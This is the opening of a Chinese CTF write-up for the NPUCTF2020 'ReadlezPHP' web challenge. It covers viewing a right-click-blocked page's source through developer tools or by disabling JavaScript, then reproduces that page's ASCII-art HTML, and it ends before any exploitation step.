# Writeup 4 [NPUCTF2020]ReadlezPHP



## 一、题目信息

- **目标**：读取 flag
- **入口**：一个显示时间的 Web 页面
- **环境**：BUUCTF 在线靶场

---

## 二、初始信息收集

### 2.1 访问首页

访问靶机地址，看到一个标题为「西北🍉✌带学报时台」的页面，显示当前时间，背景是炫酷的 ASCII 艺术风格。

### 2.2 查看页面源码

右键无法查看源码，页面禁用了右键菜单。

**解决方法**：

- 在浏览器中，按 `F12` 打开开发者工具

- 在浏览器“设置”中禁用 JavaScript

  ![01-1777191054378-2.jpg](https://raw.gitcode.com/user-images/assets/9776925/af60d547-a03a-402e-93e1-2de0dbf10582/01-1777191054378-2.jpg '01-1777191054378-2.jpg')



查看源码：

```
<html>
<head>
<title>西北🍉✌带学报时台</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<STYLE type=text/css>BODY {
	SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; SCROLLBAR-3DLIGHT-COLOR: #000000; SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #ffffff; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #000000
}
.Estilo10 {
	COLOR: #ffffff; FONT-FAMILY: Haettenschweiler
}
.Estilo8 {
	FONT-SIZE: 10px; COLOR: #ffffff; FONT-FAMILY: Haettenschweiler
}
</STYLE>
<body onselectstart="return false;" oncontextmenu="return false;" >
<SCRIPT language=JavaScript1.2>  
if (document.all)  
document.body.style.cssText="border:30 ridge red"  
</SCRIPT></TR>
<body bgcolor="#000000">
<STYLE>A {
	FONT-SIZE: 12px; COLOR: #cccccc; TEXT-DECORATION: none
}
A:hover {
	COLOR: #ff9900
}
A.blue {
	COLOR: darkblue
}
BODY {
	FONT-SIZE: 12px
}
P {
	FONT-SIZE: 12px
}
TD {
	FONT-SIZE: 12px
}
A:link {
	COLOR: #ffffff
}
</STYLE>
<CENTER><PRE><FONT size=-1>
<FONT color=#454648>0<FONT color=#454746>1<FONT color=#494b4a>0<FONT color=#434542>0<FONT color=#3d3f3a>1<FONT color=#3f413c>0<FONT color=#43463f>0<FONT color=#42453e>1<FONT color=#3b3b39>0<FONT color=#393937>0<FONT color=#434341>1<FONT color=#474745>0<FONT color=#1f1f1d>0<FONT color=#0a0a08>1<FONT color=#060604>0<FONT color=#090907>0<FONT color=#050706>1<FONT color=#040605>00<FONT color=#010302>10<FONT color=#000100>0<FONT color=#010302>1<FONT color=#060805>0<FONT color=#161510>0<FONT color=#3e3d38>1<FONT color=#494a44>0<FONT color=#4d5049>0<FONT color=#545750>1<FONT color=#4f544d>0<FONT color=#595e57>0<FONT color=#596059>1<FONT color=#5e635f>0<FONT color=#5c615d>0<FONT color=#555a56>1<FONT color=#515650>0<FONT color=#50554e>0<FONT color=#4f554b>1<FONT color=#50564c>0<FONT color=#51564f>0<FONT color=#4e5452>1<FONT color=#474d4b>0<FONT color=#454948>0<FONT color=#515554>1<FONT color=#383a39>0<FONT color=#090909>0<FONT color=#000000>1<FONT color=#010000>0<FONT color=#010101>0<FONT color=#000000>10010<FONT color=#010101>0<FONT color=#171717>1<FONT color=#2f2d30>0<FONT color=#2e2d2b>0<FONT color=#2b2a25>1<FONT color=#282820>0<FONT color=#2d2d25>0<FONT color=#353430>1<FONT color=#323031>0<FONT color=#070508>0
<FONT color=#87888a>1</FONT><FONT color=#636564>0</FONT><FONT color=#676968>0</FONT><FONT color=#686a67>1</FONT><FONT color=#636560>0</FONT><FONT color=#62645f>0</FONT><FONT color=#63665f>1</FONT><FONT color=#61645d>0</FONT><FONT color=#5e5e5c>0</FONT><FONT color=#656563>1</FONT><FONT color=#5c5c5a>0</FONT><FONT color=#252523>0</FONT><FONT color=#10100e>1</FONT><FONT color=#060604>0</FONT><FONT color=#0a0a08>0</FONT><FONT color=#0b0b09>1</FONT><FONT color=#000201>0</FONT><FONT color=#000100>0</FONT><FONT color=#010302>1</FONT><FONT color=#000100>0</FONT><FONT color=#010302>0</FONT><FONT color=#040605>1</FONT><FONT color=#272928>0</FONT><FONT color=#5d5f5e>0</FONT><FONT color=#747476>1</FONT><FONT color=#828284>0</FONT><FONT color=#88898b>0</FONT><FONT color=#7d8182>1</FONT><FONT color=#838788>0</FONT><FONT color=#7f8585>0</FONT><FONT color=#838989>1</FONT><FONT color=#848c8e>0</FONT><FONT color=#82878b>0</FONT><FONT color=#7f8488>1</FONT><FONT color=#808588>0</FONT><FONT color=#818787>0</FONT><FONT color=#7b8181>1</FONT><FONT color=#7a807e>0</FONT><FONT color=#797f7b>0</FONT><FONT color=#7a807e>1</FONT><FONT color=#7b817f>0</FONT><FONT color=#797f7d>0</FONT><FONT color=#808483>1</FONT><FONT color=#7e8281>0</FONT><FONT color=#767877>0</FONT><FONT color=#646464>1</FONT><FONT color=#171717>0</FONT><FONT color=#030102>0</FONT><FONT color=#010101>1</FONT><FONT color=#000000>00100</FONT><FONT color=#010101>1</FONT><FONT color=#000000>0</FONT><FONT color=#211f22>0</FONT><FONT color=#585755>1</FONT><FONT color=#5b5a55>0</FONT><FONT color=#4d4d45>0</FONT><FONT color=#4b4b43>1</FONT><FONT color=#4e4d49>0</FONT><FONT color=#525051>0</FONT><FONT color=#010002>1
<FONT color=#747577>0</FONT><FONT color=#6d6f6e>0</FONT><FONT color=#676968>1</FONT><FONT color=#656764>0</FONT><FONT color=#636560>0</FONT><FONT color=#5c5e59>1</FONT><FONT color=#5d6059>0</FONT><FONT color=#5f625b>0</FONT><FONT color=#646462>1</FONT><FONT color=#3e3e3c>0</FONT><FONT color=#0e0e0c>0</FONT><FONT color=#090907>1</FONT><FONT color=#0d0d0b>0</FONT><FONT color=#070705>0</FONT><FONT color=#020200>1</FONT><FONT color=#010100>0</FONT><FONT color=#000201>010</FONT><FONT color=#000100>0</FONT><FONT color=#0a0c0b>1</FONT><FONT color=#404241>0</FONT><FONT color=#717372>0</FONT><FONT color=#757678>1</FONT><FONT color=#76767e>0</FONT><FONT color=#71747b>0</FONT><FONT color=#6e7178>1</FONT><FONT color=#70757b>0</FONT><FONT color=#82898f>0</FONT><FONT color=#787f85>1</FONT><FONT color=#7c858a>0</FONT><FONT color=#838c91>0</FONT><FONT color=#7c8389>1</FONT><FONT color=#7f868c>0</FONT><FONT color=#71797c>0</FONT><FONT color=#6e7678>1</FONT><FONT color=#6c7574>0</FONT><FONT color=#67706f>0</FONT><FONT color=#646d6a>1</FONT><FONT color=#636c69>0</FONT><FONT color=#6d7371>0</FONT><FONT color=#6f7573>1</FONT><FONT color=#6f7372>0</FONT><FONT color=#717574>0</FONT><FONT color=#6b6d6c>1</FONT><FONT color=#626262>0</FONT><FONT color=#3b3b3b>0</FONT><FONT color=#090708>1</FONT><FONT color=#000000>00100100</FONT><FONT color=#010002>1</FONT><FONT color=#090806>0</FONT><FONT color=#45443f>0</FONT><FONT color=#53534b>1</FONT><FONT color=#4d4d45>0</FONT><FONT color=#4e4d49>0</FONT><FONT color=#4f4d4e>1</FONT><FONT color=#010002>0
<FONT color=#797a7c>0</FONT><FONT color=#767877>1</FONT><FONT color=#6c6e6d>0</FONT><FONT color=#666865>0</FONT><FONT color=#636560>1</FONT><FONT color=#656762>0</FONT><FONT color=#666962>0</FONT><FONT color=#5b5e57>1</FONT><FONT color=#2a2a28>0</FONT><FONT color=#090907>0</FONT><FONT color=#0c0c0a>1</FONT><FONT color=#080806>0</FONT><FONT color=#050503>0</FONT><FONT color=#030301>1</FONT><FONT color=#010100>0</FONT><FONT color=#000000>0</FONT><FONT color=#000100>1</FONT><FONT color=#000201>0</FONT><FONT color=#000100>0</FONT><FONT color=#0d0f0e>1</FONT><FONT color=#424443>0</FONT><FONT color=#676968>0</FONT><FONT color=#6d6f6e>1</FONT><FONT color=#777978>0</FONT><FONT color=#73777a>0</FONT><FONT color=#7a7f82>1</FONT><FONT color=#888d90>0</FONT><FONT color=#828a8c>0</FONT><FONT color=#848e8f>1</FONT><FONT color=#869091>0</FONT><FONT color=#788484>0</FONT><FONT color=#75817f>1</FONT><FONT color=#7e8a86>0</FONT><FONT color=#7f8b87>0</FONT><FONT color=#808d86>1</FONT><FONT color=#98a59e>0</FONT><FONT color=#97a49b>0</FONT><FONT color=#a5b2a8>1</FONT><FONT color=#909d93>0</FONT><FONT color=#7d8880>0</FONT><FONT color=#747a78>1</FONT><FONT color=#666c6a>0</FONT><FONT color=#6a6e6d>0</FONT><FONT color=#646867>1</FONT><FONT color=#656766>0</FONT><FONT color=#5a5a5a>0</FONT><FONT color=#3a3a3a>1</FONT><FONT color=#0e0c0d>0</FONT><FONT color=#000000>01001001</FONT><FONT color=#030104>0</FONT><FONT color=#020100>0</FONT><FONT color=#060500>1</FONT><FONT color=#3a3a32>0</FONT><FONT color=#52524a>0</FONT><FONT color=#4c4b47>1</FONT><FONT color=#575556>0</FONT><FONT color=#010002>0
<FONT color=#787e7a>1</FONT><FONT color=#747a76>0</FONT><FONT color=#646965>0</FONT><FONT color=#676c68>1</FONT><FONT color=#696b68>0</FONT><FONT color=#626260>0</FONT><FONT color=#555553>1</FONT><FONT color=#1a1917>0</FONT><FONT color=#080808>0</FONT><FONT color=#0b0b0b>1</FONT><FONT color=#080808>0</FONT><FONT color=#000000>0100100</FONT><FONT color=#090907>1</FONT><FONT color=#353533>0</FONT><FONT color=#4e4e4c>0</FONT><FONT color=#585856>1</FONT><FONT color=#6a6a68>0</FONT><FONT color=#727471>0</FONT><FONT color=#7b817d>1</FONT><FONT color=#888e8a>0</FONT><FONT color=#868c88>0</FONT><FONT color=#9ea4a0>1</FONT><FONT color=#b6bcb8>0</FONT><FONT color=#a8aeaa>0</FONT><FONT color=#9ca29e>1</FONT><FONT color=#868c88>0</FONT><FONT color=#787e7a>0</FONT><FONT color=#848a86>1</FONT><FONT color=#979d99>0</FONT><FONT color=#9ba19d>0</FONT><FONT color=#8a908c>1</FONT><FONT color=#868c88>0</FONT><FONT color=#7c827e>0</FONT><FONT color=#7b807c>1</FONT><FONT color=#828284>0</FONT><FONT color=#717173>0</FONT><FONT color=#5f5f61>1</FONT><FONT color=#525254>0</FONT><FONT color=#4b4b4d>0</FONT><FONT color=#3e3e40>1</FONT><FONT color=#272729>0</FONT><FONT color=#040406>0</FONT><FONT color=#000000>10010010010</FONT><FONT color=#030303>0</FONT><FONT color=#383838>1</FONT><FONT color=#515151>0</FONT><FONT color=#505050>0</FONT><FONT color=#000000>1
<FONT color=#747a76>00</FONT><FONT color=#626763>1</FONT><FONT color=#666b67>0</FONT><FONT color=#676966>0</FONT><FONT color=#434341>1</FONT><FONT color=#0d0d0b>0</FONT><FONT color=#050402>0</FONT><FONT color=#080808>1</FONT><FONT color=#020202>0</FONT><FONT color=#000000>0</FONT><FONT color=#010101>1</FONT><FONT color=#000000>00100</FONT><FONT color=#0e0e0c>1</FONT><FONT color=#343432>0</FONT><FONT color=#4d4d4b>0</FONT><FONT color=#555553>10</FONT><FONT color=#595957>0</FONT><FONT color=#5a5c59>1</FONT><FONT color=#5c615d>0</FONT><FONT color=#555a56>0</FONT><FONT color=#4f5450>1</FONT><FONT color=#464b47>0</FONT><FONT color=#3f4440>0</FONT><FONT color=#474c48>1</FONT><FONT color=#6b706c>0</FONT><FONT color=#636864>0</FONT><FONT color=#5a5f5b>1</FONT><FONT color=#5d625e>0</FONT><FONT color=#616662>0</FONT><FONT color=#3b403c>1</FONT><FONT color=#272c28>0</FONT><FONT color=#303531>0</FONT><FONT color=#353a36>1</FONT><FONT color=#3b403c>0</FONT><FONT color=#424242>0</FONT><FONT color=#3d3d3d>1</FONT><FONT color=#2d2d2d>0</FONT><FONT color=#313131>0</FONT><FONT color=#2e2e2e>1</FONT><FONT color=#212121>0</FONT><FONT color=#171717>0</FONT><FONT color=#030303>1</FONT><FONT color=#000000>001001001</FONT><FONT color=#010101>0</FONT><FONT color=#000000>0</FONT><FONT color=#030303>1</FONT><FONT color=#101010>0</FONT><FONT color=#444444>0</FONT><FONT color=#525252>1</FONT><FONT color=#010101>0
<FONT color=#6c726e>0</FONT><FONT color=#717773>1</FONT><FONT color=#676c68>0</FONT><FONT color=#666b67>0</FONT><FONT color=#373936>1</FONT><FONT color=#070705>0</FONT><FONT color=#000000>0</FONT><FONT color=#010000>1</FONT><FONT color=#010101>0</FONT><FONT color=#000000>010</FONT><FONT color=#010101>0</FONT><FONT color=#000000>100</FONT><FONT color=#030301>1</FONT><FONT color=#1f1f1d>0</FONT><FONT color=#424240>01</FONT><FONT color=#4c4c4a>0</FONT><FONT color=#50504e>0</FONT><FONT color=#474745>1</FONT><FONT color=#434341>0</FONT><FONT color=#3d3f3c>0</FONT><FONT color=#2d2f2c>1</FONT><FONT color=#0c0e0b>0</FONT><FONT color=#000100>0</FONT><FONT color=#000200>10</FONT><FONT color=#2c2e2b>0</FONT><FONT color=#4d4f4c>1</FONT><FONT color=#454744>0</FONT><FONT color=#3d3f3c>0</FONT><FONT color=#1c1e1b>1</FONT><FONT color=#000100>00</FONT><FONT color=#090b08>1</FONT><FONT color=#1b1d1a>0</FONT><FONT color=#282a27>0</FONT><FONT color=#282924>1</FONT><FONT color=#1f201b>0</FONT><FONT color=#20211c>0</FONT><FONT color=#23241f>1</FONT><FONT color=#171813>0</FONT><FONT color=#1b1c17>0</FONT><FONT color=#1c1d18>1</FONT><FONT color=#10110c>0</FONT><FONT color=#020202>0</FONT><FONT color=#000000>1</FONT><FONT color=#010101>0</FONT><FONT color=#000000>0100100100</FONT><FONT color=#1a1a1a>1</FONT><FONT color=#575757>0</FONT><FONT color=#020202>0
<FONT color=#686e6a>1</FONT><FONT color=#777d79>0</FONT><FONT color=#656a66>0</FONT><FONT color=#3a3f3b>1</FONT><FONT color=#010300>0</FONT><FONT color=#030301>0</FONT><FONT color=#000000>1</FONT><FONT color=#010000>0</FONT><FONT color=#010101>0</FONT><FONT color=#000000>10010</FONT><FONT color=#010101>01</FONT><FONT color=#11110f>0</FONT><FONT color=#262624>0</FONT><FONT color=#333331>1</FONT><FONT color=#3b3b39>0</FONT><FONT color=#3c3c3a>0</FONT><FONT color=#3e3e3c>1</FONT><FONT color=#353533>0</FONT><FONT color=#2d2d2b>0</FONT><FONT color=#232321>1</FONT><FONT color=#080806>0</FONT><FONT color=#000000>0</FONT><FONT color=#010100>10</FONT><FONT color=#000000>0</FONT><FONT color=#171715>1</FONT><FONT color=#282826>0</FONT><FONT color=#262624>0</FONT><FONT color=#222220>1</FONT><FONT color=#040402>0</FONT><FONT color=#010100>0</FONT><FONT color=#030301>1</FONT><FONT color=#010100>0</FONT><FONT color=#060604>0</FONT><FONT color=#1d1e19>1</FONT><FONT color=#292a24>0</FONT><FONT color=#2b2c26>0</FONT><FONT color=#272822>1</FONT><FONT color=#1e1f19>0</FONT><FONT color=#161711>0</FONT><FONT color=#14150f>1</FONT><FONT color=#24251f>0</FONT><FONT color=#2f302b>0</FONT><FONT color=#060606>1</FONT><FONT color=#010101>00</FONT><FONT color=#000000>1001001001</FONT><FONT color=#040404>0</FONT><FONT color=#343434>0</FONT><FONT color=#000000>1
<FONT color=#6c6c6c>0</FONT><FONT color=#747474>0</FONT><FONT color=#262626>1</FONT><FONT color=#000000>0010010010</FONT><FONT color=#020202>0</FONT><FONT color=#010101>1</FONT><FONT color=#070705>0</FONT><FONT color=#181913>0</FONT><FONT color=#23241e>1</FONT><FONT color=#34352f>00</FONT><FONT color=#353630>1</FONT><FONT color=#34352f>0</FONT><FONT color=#42433d>0</FONT><FONT color=#363732>1</FONT><FONT color=#0d090a>0</FONT><FONT color=#030000>0</FONT><FONT color=#020001>1</FONT><FONT color=#000000>0</FONT><FONT color=#020202>0</FONT><FONT color=#000100>1</FONT><FONT color=#151918>0</FONT><FONT color=#222423>0</FONT><FONT color=#1c1819>1</FONT><FONT color=#242021>0</FONT><FONT color=#110f10>0</FONT><FONT color=#010000>1</FONT><FONT color=#010101>0</FONT><FONT color=#000000>0</FONT><FONT color=#010101>1</FONT><FONT color=#020403>0</FONT><FONT color=#1b1b1b>0</FONT><FONT color=#2c2c2c>1</FONT><FONT color=#454545>0</FONT><FONT color=#484848>0</FONT><FONT color=#3f3f3f>1</FONT><FONT color=#404040>0</FONT><FONT color=#585858>0</FONT><FONT color=#767676>1</FONT><FONT color=#383838>0</FONT><FONT color=#000000>0</FONT><FONT color=#020202>1</FONT><FONT color=#000000>00100100100</FONT><FONT color=#2e2e2e>1</FONT><FONT color=#010101>0
<FONT color=#6c6c6c>0</FONT><FONT color=#4b4b4b>1</FONT><FONT color=#000000>0</FONT><FONT color=#010101>0</FONT><FONT color=#000000>100100100</FONT><FONT color=#020202>1</FONT><FONT color=#000000>0</FONT><FONT color=#0c0c0a>0</FONT><FONT color=#1f201b>1</FONT><FONT color=#2a2b26>0</FONT><FONT color=#2f302b>0</FONT><FONT color=#3b3c37>1</FONT><FONT color=#50514c>0</FONT><FONT color=#5b5c57>0</FONT><FONT color=#3a3b36>1</FONT><FONT color=#060702>0</FONT><FONT color=#040001>0</FONT><FONT color=#050102>1</FONT><FONT color=#020001>0</FONT><FONT color=#020202>0</FONT><FONT color=#000000>1</FONT><FONT color=#0b0d0c>0</FONT><FONT color=#222625>0</FONT><FONT color=#2d3130>1</FONT><FONT color=#313332>0</FONT><FONT color=#2c2e2d>0</FONT><FONT color=#1b1b1b>1</FONT><FONT color=#040404>0</FONT><FONT color=#010101>01</FONT><FONT color=#020202>00</FONT><FONT color=#030303>1</FONT><FONT color=#0d0d0d>0</FONT><FONT color=#202020>0</FONT><FONT color=#474747>1</FONT><FONT color=#666666>0</FONT><FONT color=#717171>01</FONT><FONT color=#757575>0</FONT><FONT color=#8a8a8a>0</FONT><FONT color=#353535>1</FONT><FONT color=#000000>0</FONT><FONT color=#020202>0</FONT><FONT color=#010101>1001</FONT><FONT color=#000000>001001</FONT><FONT color=#171717>0</FONT><FONT color=#000000>0
<FONT color=#6b6b6b>1</FONT><FONT color=#232323>0</FONT><FONT color=#020202>0</FONT><FONT color=#010101>1</FONT><FONT color=#000000>001001001</FONT><FONT color=#050505>0</FONT><FONT color=#000000>0</FONT><FONT color=#1a1a1a>1</FONT><FONT color=#444442>0</FONT><FONT color=#61615f>0</FONT><FONT color=#6e6e6c>1</FONT><FONT color=#6a6a68>0</FONT><FONT color=#41413f>0</FONT><FONT color=#121210>1</FONT><FONT color=#000000>0</FONT><FONT color=#010100>0</FONT><FONT color=#030000>1</FONT><FONT color=#040001>0</FONT><FONT color=#040203>0</FONT><FONT color=#000000>1</FONT><FONT color=#282828>0</FONT><FONT color=#484a49>0</FONT><FONT color=#4a4e4d>1</FONT><FONT color=#727876>0</FONT><FONT color=#8f9a96>0</FONT><FONT color=#6a7370>1</FONT><FONT color=#515755>0</FONT><FONT color=#494d4c>0</FONT><FONT color=#161817>1</FONT><FONT color=#000000>00</FONT><FONT color=#010000>1</FONT><FONT color=#000000>00</FONT><FONT color=#050505>1</FONT><FONT color=#0a0a0a>0</FONT><FONT color=#252525>0</FONT><FONT color=#4f4f4f>1</FONT><FONT color=#828282>0</FONT><FONT color=#8a8a8a>0</FONT><FONT color=#8b8b8b>1</FONT><FONT color=#6c6c6c>0</FONT><FONT color=#191919>0</FONT><FONT color=#020202>1</FONT><FONT color=#000000>0010010010</FONT><FONT color=#0e0e0e>0</FONT><FONT color=#000000>1
<FONT color=#515151>0</FONT><FONT color=#080808>0</FONT><FONT color=#030303>1</FONT><FONT color=#020202>0</FONT><FONT color=#000000>010010010</FONT><FONT color=#181818>0</FONT><FONT color=#5e5e5e>1</FONT><FONT color=#747474>0</FONT><FONT color=#707070>0</FONT><FONT color=#4c4c4c>1</FONT><FONT color=#272727>0</FONT><FONT color=#0b0b0b>0</FONT><FONT color=#000000>1</FONT><FONT color=#030303>0</FONT><FONT color=#000000>01</FONT><FONT color=#030000>0</FONT><FONT color=#050102>0</FONT><FONT color=#0b090a>1</FONT><FONT color=#3d3d3d>0</FONT><FONT color=#464646>0</FONT><FONT color=#585a59>1</FONT><FONT color=#828685>0</FONT><FONT color=#9ba4a1>0</FONT><FONT color=#90a19b>1</FONT><FONT color=#97a6a1>0</FONT><FONT color=#818d89>0</FONT><FONT color=#5e6764>1</FONT><FONT color=#595d5c>0</FONT><FONT color=#3a3a3a>0</FONT><FONT color=#030102>10</FONT><FONT color=#000000>01001</FONT><FONT color=#050505>0</FONT><FONT color=#0e0e0e>0</FONT><FONT color=#3c3c3c>1</FONT><FONT color=#656565>0</FONT><FONT color=#6e6e6e>0</FONT><FONT color=#3a3a3a>1</FONT><FONT color=#010101>0</FONT><FONT color=#000000>010010010</FONT><FONT color=#020202>0</FONT><FONT color=#060606>1</FONT><FONT color=#010101>0
<FONT color=#414141>0</FONT><FONT color=#030303>1</FONT><FONT color=#020202>0</FONT><FONT color=#000000>01001</FONT><FONT color=#010101>0</FONT><FONT color=#000000>01</FONT><FONT color=#151515>0</FONT><FONT color=#5e5e5e>0</FONT><FONT color=#717171>1</FONT><FONT color=#5f5f5f>0</FONT><FONT color=#5a5a5a>0</FONT><FONT color=#303030>1</FONT><FONT color=#0c0c0c>0</FONT><FONT color=#040404>0</FONT><FONT color=#000000>10010</FONT><FONT color=#020403>0</FONT><FONT color=#272928>1</FONT><FONT color=#414342>0</FONT><FONT color=#454746>0</FONT><FONT color=#5c5e5d>1</FONT><FONT color=#707271>0</FONT><FONT color=#737574>0</FONT><FONT color=#7a7c7b>1</FONT><FONT color=#727773>0</FONT><FONT color=#6c716d>0</FONT><FONT color=#787d79>1</FONT><FONT color=#7b807c>0</FONT><FONT color=#6a6f6b>0</FONT><FONT color=#656a66>1</FONT><FONT color=#4d524e>0</FONT><FONT color=#262b27>0</FONT><FONT color=#030303>1</FONT><FONT color=#000000>0</FONT><FONT color=#020202>010</FONT><FONT color=#050505>0</FONT><FONT color=#000000>1</FONT><FONT color=#373737>0</FONT><FONT color=#646464>0</FONT><FONT color=#515151>1</FONT><FONT color=#2e2e2e>0</FONT><FONT color=#000000>01</FONT><FONT color=#010101>00</FONT><FONT color=#000000>1001001</FONT><FONT color=#050505>0</FONT><FONT color=#000000>0
<FONT color=#383838>1</FONT><FONT color=#000000>0</FONT><FONT color=#010101>0</FONT><FONT color=#020202>1</FONT><FONT color=#000000>0010</FONT><FONT color=#020202>0</FONT><FONT color=#000000>1</FONT><FONT color=#020202>00</FONT><FONT color=#2e2e2e>1</FONT><FONT color=#3b3b3b>0</FONT><FONT color=#3a3a3a>0</FONT><FONT color=#3e3e3e>1</FONT><FONT color=#616161>0</FONT><FONT color=#757575>0</FONT><FONT color=#616161>1</FONT><FONT color=#3f3f3f>0</FONT><FONT color=#383838>0</FONT><FONT color=#3d3d3d>1</FONT><FONT color=#505050>0</FONT><FONT color=#6b6b6b>0</FONT><FONT color=#696b6a>1</FONT><FONT color=#575958>0</FONT><FONT color=#4b4d4c>0</FONT><FONT color=#606261>1</FONT><FONT color=#6a6c6b>0</FONT><FONT color=#626463>0</FONT><FONT color=#4c4e4d>1</FONT><FONT color=#0f1110>0</FONT><FONT color=#000100>0</FONT><FONT color=#030502>1</FONT><FONT color=#000100>0</FONT><FONT color=#232522>0</FONT><FONT color=#5a5c59>1</FONT><FONT color=#5c5e5b>0</FONT><FONT color=#4d4f4c>0</FONT><FONT color=#6f716e>1</FONT><FONT color=#909090>0</FONT><FONT color=#868686>0</FONT><FONT color=#676767>1</FONT><FONT color=#595959>00</FONT><FONT color=#5f5f5f>1</FONT><FONT color=#868686>0</FONT><FONT color=#888888>0</FONT><FONT color=#686868>1</FONT><FONT color=#404040>0</FONT><FONT color=#1d1d1d>0</FONT><FONT color=#000000>10</FONT><FONT color=#010101>01</FONT><FONT color=#000000>00100</FONT><FONT color=#010101>1</FONT><FONT color=#000000>0</FONT><FONT color=#0b0b0b>0</FONT><FONT color=#010101>1
<FONT color=#3c3c3c>0</FONT><FONT color=#020202>0</FONT><FONT color=#040404>1</FONT><FONT color=#000000>001001001</FONT><FONT color=#040404>0</FONT><FONT color=#252525>0</FONT><FONT color=#3a3a3a>1</FONT><FONT color=#393939>0</FONT><FONT color=#3a3a3a>0</FONT><FONT color=#414141>10</FONT><FONT color=#4c4c4c>0</FONT><FONT color=#464646>1</FONT><FONT color=#414141>0</FONT><FONT color=#373737>0</FONT><FONT color=#353535>1</FONT><FONT color=#323433>0</FONT><FONT color=#3a3c3b>0</FONT><FONT color=#4c4e4d>1</FONT><FONT color=#5a5c5b>0</FONT><FONT color=#525453>0</FONT><FONT color=#3f4140>1</FONT><FONT color=#0c0e0d>0</FONT><FONT color=#000100>0</FONT><FONT color=#030301>1</FONT><FONT color=#000000>0</FONT><FONT color=#020200>0</FONT><FONT color=#000000>1</FONT><FONT color=#242422>0</FONT><FONT color=#40403e>01</FONT><FONT color=#2e2e2c>0</FONT><FONT color=#333333>0</FONT><FONT color=#434343>1</FONT><FONT color=#444444>00</FONT><FONT color=#4a4a4a>1</FONT><FONT color=#424242>0</FONT><FONT color=#3c3c3c>0</FONT><FONT color=#2e2e2e>1</FONT><FONT color=#2b2b2b>0</FONT><FONT color=#1e1e1e>0</FONT><FONT color=#080808>1</FONT><FONT color=#000000>001001001</FONT><FONT color=#010101>0</FONT><FONT color=#020202>0</FONT><FONT color=#151515>1</FONT><FONT color=#000000>0
<FONT color=#535353>0</FONT><FONT color=#141414>1</FONT><FONT color=#000000>0</FONT><FONT color=#020202>0</FONT><FONT color=#000000>1001001001</FONT><FONT color=#0d0d0d>0</FONT><FONT color=#323232>0</FONT><FONT color=#393939>1</FONT><FONT color=#373737>0</FONT><FONT color=#363636>0</FONT><FONT color=#323232>1</FONT><FONT color=#2f2f2f>0</FONT><FONT color=#303030>0</FONT><FONT color=#2e2e2e>1</FONT><FONT color=#303030>0</FONT><FONT color=#373938>0</FONT><FONT color=#3e403f>1</FONT><FONT color=#424443>00</FONT><FONT color=#434544>1</FONT><FONT color=#2f3130>0</FONT><FONT color=#232524>0</FONT><FONT color=#2f2f2f>1</FONT><FONT color=#3f3b3a>0</FONT><FONT color=#3e3a39>0</FONT><FONT color=#2c2827>1</FONT><FONT color=#2e2a29>0</FONT><FONT color=#34302f>0</FONT><FONT color=#312d2c>1</FONT><FONT color=#353130>0</FONT><FONT color=#42413f>0</FONT><FONT color=#252525>1</FONT><FONT color=#2b2b2b>0</FONT><FONT color=#303030>0</FONT><FONT color=#2b2b2b>1</FONT><FONT color=#272727>0</FONT><FONT color=#202020>0</FONT><FONT color=#242424>1</FONT><FONT color=#222222>0</FONT><FONT color=#121212>0</FONT><FONT color=#010101>1</FONT><FONT color=#000000>0</FONT><FONT color=#010101>0</FONT><FONT color=#000000>10010010</FONT><FONT color=#010101>0</FONT><FONT color=#000000>1</FONT><FONT color=#252525>0</FONT><FONT color=#000000>0
<FONT color=#595957>1</FONT><FONT color=#3f3f3d>0</FONT><FONT color=#020200>0</FONT><FONT color=#010100>1</FONT><FONT color=#000000>001001001001</FONT><FONT color=#030303>0</FONT><FONT color=#161616>0</FONT><FONT color=#212121>1</FONT><FONT color=#1e1e1e>0</FONT><FONT color=#232323>0</FONT><FONT color=#2d2d2d>1</FONT><FONT color=#353535>0</FONT><FONT color=#373737>0</FONT><FONT color=#3e3e3e>1</FONT><FONT color=#414141>0</FONT><FONT color=#4f4f4f>0</FONT><FONT color=#484848>1</FONT><FONT color=#4b4b4b>0</FONT><FONT color=#454545>0</FONT><FONT color=#4a4a4a>1</FONT><FONT color=#454545>0</FONT><FONT color=#444444>01</FONT><FONT color=#424242>00</FONT><FONT color=#444444>1</FONT><FONT color=#515151>0</FONT><FONT color=#575757>0</FONT><FONT color=#535351>1</FONT><FONT color=#31322c>0</FONT><FONT color=#151610>0</FONT><FONT color=#1f201b>1</FONT><FONT color=#20211c>0</FONT><FONT color=#171715>0</FONT><FONT color=#070707>1</FONT><FONT color=#000000>0</FONT><FONT color=#010103>0</FONT><FONT color=#000000>100100100100</FONT><FONT color=#020202>1</FONT><FONT color=#040404>0</FONT><FONT color=#393939>0</FONT><FONT color=#010101>1
<FONT color=#494947>0</FONT><FONT color=#595957>0</FONT><FONT color=#1d1d1b>1</FONT><FONT color=#010100>0</FONT><FONT color=#000000>010010010010</FONT><FONT color=#010101>0</FONT><FONT color=#000000>10</FONT><FONT color=#0d0d0d>0</FONT><FONT color=#2b2b2b>1</FONT><FONT color=#3e3e3e>0</FONT><FONT color=#3c3c3c>0</FONT><FONT color=#414141>1</FONT><FONT color=#434343>0</FONT><FONT color=#484848>0</FONT><FONT color=#525252>1</FONT><FONT color=#696969>0</FONT><FONT color=#767676>0</FONT><FONT color=#7b7b7b>1</FONT><FONT color=#797979>0</FONT><FONT color=#727272>0</FONT><FONT color=#5f5f5f>1</FONT><FONT color=#4f4f4f>0</FONT><FONT color=#464646>0</FONT><FONT color=#474747>1</FONT><FONT color=#565656>0</FONT><FONT color=#5b5b5b>0</FONT><FONT color=#595959>1</FONT><FONT color=#434341>0</FONT><FONT color=#373832>0</FONT><FONT color=#21221c>1</FONT><FONT color=#0a0b06>0</FONT><FONT color=#12130e>0</FONT><FONT color=#070705>1</FONT><FONT color=#000000>0</FONT><FONT color=#010101>0</FONT><FONT color=#000002>1</FONT><FONT color=#000000>0010010010010</FONT><FONT color=#0d0d0d>0</FONT><FONT color=#3a3a3a>1</FONT><FONT color=#020202>0
